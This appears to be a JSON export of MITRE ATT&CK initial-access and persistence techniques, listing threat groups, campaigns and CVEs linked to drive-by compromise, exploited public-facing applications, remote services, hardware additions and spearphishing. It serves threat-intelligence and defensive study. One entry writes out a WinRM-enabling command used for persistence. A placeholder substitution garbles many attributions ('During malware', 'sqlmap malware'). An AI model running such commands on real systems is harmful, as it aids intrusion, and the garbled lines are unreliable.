        "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.Multiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scriptingScript files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversaryMalicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[1]Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.In some cases a second visit to the website after the initial scan is required before exploit code is delivered.Unlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.Adversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.[2]",
        "Procedure": {
            "G0138": {
                "ID": "G0138",
                "Name": "Andariel",
                "Description": "malware has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.[3][4]"
            },
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "malware performed a watering hole attack on forbes.com in 2014 to compromise targets.[5]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has compromised targets via strategic web compromise utilizing custom exploit kits.[6] malware used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.[7]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware has infected victims by tricking them into visiting compromised watering hole websites.[8][9]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.[10][11][12]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has conducted watering holes schemes to gain initial access to victims.[13][14]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has used watering hole attacks to gain access.[15]"
            },
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware spread through watering holes on popular sites by injecting JavaScript into the HTML body or a .js file.[16][17]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware compromised three Japanese websites using a Flash exploit to perform watering hole attacks.[18]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware has been spread through malicious advertisements on websites.[19]"
            },
            "C0010": {
                "ID": "C0010",
                "Name": "C0010",
                "Description": "During malware, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.[20]"
            },
            "G0070": {
                "ID": "G0070",
                "Name": "Dark Caracal",
                "Description": "malware leveraged a watering hole to serve up malicious code.[21]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware used embedded iframes on hotel login portals to redirect selected victims to download malware.[22]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.[23][24][25]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has performed watering hole attacks.[26]"
            },
            "G0066": {
                "ID": "G0066",
                "Name": "Elderwood",
                "Description": "malware has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.[27][28][29]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware has used compromised websites and Google Ads to bait victims into downloading its installer.[30][31]"
            },
            "S0215": {
                "ID": "S0215",
                "Name": "KARAE",
                "Description": "malware was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.[11]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware delivered RATANKBA and other malicious code to victims via a compromised legitimate website.[32][33]"
            },
            "G0077": {
                "ID": "G0077",
                "Name": "Leafminer",
                "Description": "malware has infected victims using watering holes.[34]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has infected victims using watering holes.[35]"
            },
            "S0451": {
                "ID": "S0451",
                "Name": "LoudMiner",
                "Description": "malware is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.[36]"
            },
            "G0095": {
                "ID": "G0095",
                "Name": "Machete",
                "Description": "malware has distributed malware through a fake blog website.[37]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has conducted watering-hole attacks through media and magazine websites.[38]"
            },
            "G1020": {
                "ID": "G1020",
                "Name": "Mustard Tempest",
                "Description": "malware has used drive-by downloads for initial infection, often using fake browser updates as a lure.[39][40][41][42]"
            },
            "C0016": {
                "ID": "C0016",
                "Name": "Operation Dust Storm",
                "Description": "During malware, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.[43]"
            },
            "G0040": {
                "ID": "G0040",
                "Name": "Patchwork",
                "Description": "malware has used watering holes to deliver files with exploits to initial victims.[44][45]"
            },
            "G0068": {
                "ID": "G0068",
                "Name": "PLATINUM",
                "Description": "malware has sometimes used drive-by attacks against vulnerable browser plugins.[46]"
            },
            "S0216": {
                "ID": "S0216",
                "Name": "POORAIM",
                "Description": "malware has been delivered through compromised sites acting as watering holes.[11]"
            },
            "G0056": {
                "ID": "G0056",
                "Name": "PROMETHIUM",
                "Description": "malware has used watering hole attacks to deliver malicious versions of legitimate installers.[47]"
            },
            "S0496": {
                "ID": "S0496",
                "Name": "REvil",
                "Description": "malware has infected victim machines through compromised websites and exploit kits.[48][49][50][51]"
            },
            "G0048": {
                "ID": "G0048",
                "Name": "RTM",
                "Description": "malware has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network Yandex.Direct.[52][53]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware has been delivered to targets via downloads from malicious domains.[54]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware has been distributed through compromised websites with malicious content often masquerading as browser updates.[39]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has extensively used strategic web compromises to target victims.[55][56]"
            },
            "G0134": {
                "ID": "G0134",
                "Name": "Transparent Tribe",
                "Description": "malware has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.[57][58][59]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has infected victims using watering holes.[60][61]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has distributed Windows malware via drive-by downloads.[62]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used compromised websites to register custom URL schemes on a remote system.[63]"
            }
        }
    },
    "T1190": {
        "ttp_name": "Exploit Public-Facing Application",
        "ttp_id": "T1190",
        "href": "/techniques/T1190",
        "tactic": "Initial Access",
        "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.[1][2][3][4][5] Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.[6][7]For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.[8][9]",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.[10][11]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access.[12][13]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used SQL injection for initial compromise.[14]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.[15] malware leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access.[16]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers.[17][18][19] [20]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has been observed using SQL injection to gain access to systems.[21][22]"
            },
            "G0135": {
                "ID": "G0135",
                "Name": "BackdoorDiplomacy",
                "Description": "malware has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. malware has also exploited mis-configured Plesk servers.[23]"
            },
            "G0098": {
                "ID": "G0098",
                "Name": "BlackTech",
                "Description": "malware has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.[24]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.[25]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.[26]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.[27]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access.[28]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j.[29][30][31][32]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware is installed following exploitation of a vulnerable FortiGate device. [33]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability, CVE-2024-21893, was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887.[34][35][36][37][38]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.[39]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish.[40]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access.[41][42]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange.[29]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances.[43][44][45][46][47]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network.[48][49]"
            },
            "G0115": {
                "ID": "G0115",
                "Name": "GOLD SOUTHFIELD",
                "Description": "malware has exploited Oracle WebLogic vulnerabilities for initial compromise.[50]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has exploited CVE-2021-44228 in Log4j and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server.[51][52][53][54][30]"
            },
            "S0224": {
                "ID": "S0224",
                "Name": "Havij",
                "Description": "malware is used to automate SQL injection.[55]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers.[56]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.[57]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via \"ProxyShell\" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379).[58][59][60][61][62][30]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.[63]"
            },
            "G1009": {
                "ID": "G1009",
                "Name": "Moses Staff",
                "Description": "malware has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.[64]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).[65]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used SQL injection exploits against extranet web servers to gain access.[66]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors exploited multiple vulnerabilities in externally facing servers.[67]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers.[68]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.[69][70]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems.[71][72]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware is executed after the attacker gains initial access to a Windows container using a known vulnerability.[73]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.[74][12]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries.[75]"
            },
            "S0225": {
                "ID": "S0225",
                "Name": "sqlmap",
                "Description": "malware can be used to automate exploitation of SQL injection vulnerabilities.[76]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.[77]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations.[78]"
            },
            "G0123": {
                "ID": "G0123",
                "Name": "Volatile Cedar",
                "Description": "malware has targeted publicly facing web servers, with both automatic and manual vulnerability discovery.[79] [80]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware gained initial access through exploitation of CVE-2021-40539 in internet-facing ManageEngine ADSelfService Plus servers.[81]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.[82]"
            }
        }
    },
    "T1133": {
        "ttp_name": "External Remote Services",
        "ttp_id": "T1133",
        "href": "/techniques/T1133",
        "tactic": "Persistence",
        "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.[1]Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.[2] Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.[3][4]",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. [5]"
            },
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware uses compromised VPN accounts for initial access to victim networks.[6]"
            },
            "G0026": {
                "ID": "G0026",
                "Name": "APT18",
                "Description": "malware actors leverage legitimate credentials to log into external remote services.[7]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used Tor and a variety of commercial VPN services to route brute force authentication attempts.[8]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used compromised identities to access networks via VPNs and Citrix.[9][10]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service.[11]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider used Citrix and VPNs to persist in compromised environments.[12]"
            },
            "C0032": {
                "ID": "C0032",
                "Name": "C0032",
                "Description": "During the malware campaign, TEMP.Veles used VPN access to persist in the victim environment.[13]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.[14][15]"
            },
            "C0004": {
                "ID": "C0004",
                "Name": "CostaRicto",
                "Description": "During malware, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.[16]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware was executed through an open Docker daemon API port.[17]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.[18][19]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN).[20]"
            },
            "G0053": {
                "ID": "G0053",
                "Name": "FIN5",
                "Description": "malware has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment.[21][22][23]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments.[24][25]"
            },
            "G0115": {
                "ID": "G0115",
                "Name": "GOLD SOUTHFIELD",
                "Description": "malware has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines.[26]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware was executed through an unsecure kubelet that allowed anonymous access to the victim environment.[4]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has gained access through VPNs including with compromised accounts and stolen VPN certificates.[27][28]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used RDP to establish persistence.[29]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware was executed in an Ubuntu container deployed via an open Docker daemon API.[30]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. [31][32]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has used external remote services such as virtual private networks (VPN) to gain initial access.[33]"
            },
            "S0362": {
                "ID": "S0362",
                "Name": "Linux Rabbit",
                "Description": "malware attempts to gain access to the server via SSH.[34]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can establish an SSH connection from a compromised host to a server.[35]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used compromised VPN accounts to gain access to victim systems.[36]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware uses remote services such as VPN, Citrix, or OWA to persist in an environment.[37]"
            },
            "C0012": {
                "ID": "C0012",
                "Name": "Operation CuckooBees",
                "Description": "During malware, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}.[38]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used stolen credentials to connect to the victim's network via VPN.[39]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. malware has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.[40][41][42]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has leveraged legitimate remote management tools to maintain persistent access.[43]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "For the malware, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools.[44][45]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments.[46][47] malware has also targeted exposed kubelets for Kubernetes environments.[4]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware actors look for and use VPN profiles during an operation to access the network using external VPN services.[48] malware has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.[49]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure.[50]"
            }
        }
    },
    "T1200": {
        "ttp_name": "Hardware Additions",
        "ttp_id": "T1200",
        "href": "/techniques/T1200",
        "tactic": "Initial Access",
        "description": "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.[1][2][3][4]",
        "Procedure": {
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company\u2019s local network.[5]"
            }
        }
    },
    "T1566": {
        "ttp_name": "Phishing",
        "ttp_id": "T1566",
        "href": "/techniques/T1566",
        "subtechnique": {
            "001": {
                "name": "Spearphishing Attachment",
                "href": "/techniques/T1566/001",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution.[1] Spearphishing may also involve social engineering techniques, such as posing as a trusted source.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
                "Procedure": {
                    "C0028": {
                        "ID": "C0028",
                        "Name": "2015 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. [2]"
                    },
                    "G0018": {
                        "ID": "G0018",
                        "Name": "admin@338",
                        "Description": "<name> has sent emails with malicious Microsoft Office documents attached.[3]"
                    },
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "The primary delivered mechanism for <name> is through email phishing messages.[4]"
                    },
                    "G0130": {
                        "ID": "G0130",
                        "Name": "Ajax Security Team",
                        "Description": "<name> has used personalized spearphishing attachments.[5]"
                    },
                    "G0138": {
                        "ID": "G0138",
                        "Name": "Andariel",
                        "Description": "<name> has conducted spearphishing campaigns that included malicious Word or Excel attachments.[6][7]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has been distributed to victims through malicious e-mail attachments.[8]"
                    },
                    "G0099": {
                        "ID": "G0099",
                        "Name": "APT-C-36",
                        "Description": "<name> has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway.[9]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has sent spearphishing emails containing malicious attachments.[10]"
                    },
                    "G0005": {
                        "ID": "G0005",
                        "Name": "APT12",
                        "Description": "<name> has sent emails with malicious Microsoft Office documents and PDFs attached.[11][12]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.[13]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> sent spearphishing emails containing malicious Microsoft Office and RAR attachments.[14][15][16][17][18][19][20][21]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used spearphishing emails with an attachment to deliver files with exploits to initial victims.[22][23][24][25]"
                    },
                    "G0013": {
                        "ID": "G0013",
                        "Name": "APT30",
                        "Description": "<name> has used spearphishing emails with malicious DOC attachments.[26]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.[27][28][29][30][31][32]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has sent spearphishing e-mails with archive attachments.[33]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> delivers malware using spearphishing emails with malicious HWP attachments.[34][35][36]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has conducted spearphishing campaigns using malicious email attachments.[37]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> leveraged spearphishing emails with malicious attachments to initially compromise victims.[38][39][40]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.[41]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> has been delivered via malicious e-mail attachments.[42]"
                    },
                    "S0642": {
                        "ID": "S0642",
                        "Name": "BADFLICK",
                        "Description": "<name> has been distributed via spearphishing campaigns containing malicious Microsoft Word documents.[43]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> is delivered via a malicious Word document inside a zip file.[44]"
                    },
                    "S0268": {
                        "ID": "S0268",
